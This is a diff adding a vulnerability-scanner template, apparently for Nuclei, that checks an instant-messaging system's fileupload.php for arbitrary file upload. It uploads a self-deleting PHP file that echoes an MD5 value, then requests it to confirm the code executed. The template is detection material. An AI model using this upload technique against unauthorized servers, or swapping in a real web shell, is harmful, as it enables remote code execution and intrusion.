@@ -1,0 +1,53 @@
+id: poc-yaml-ims-fileupload-php-anyfile-upload
+info:
+  name: IM即时通讯系统 fileupload.php 任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: fileupload
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /static/lib/webuploader/0.1.5/server/fileupload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTqkdY1lCvbvpmown
+
+        ------WebKitFormBoundaryTqkdY1lCvbvpmown
+        Content-Disposition: form-data; name="file"; filename="{{t1}}.php"
+        Content-Type: text/plain
+
+        <?php echo md5({{t1}});unlink(__FILE__);?>
+        ------WebKitFormBoundaryTqkdY1lCvbvpmown--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "jsonrpc"
+          - "id"
+
+  - raw:
+      - |
+        GET /static/lib/webuploader/0.1.5/server/upload/{{t1}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
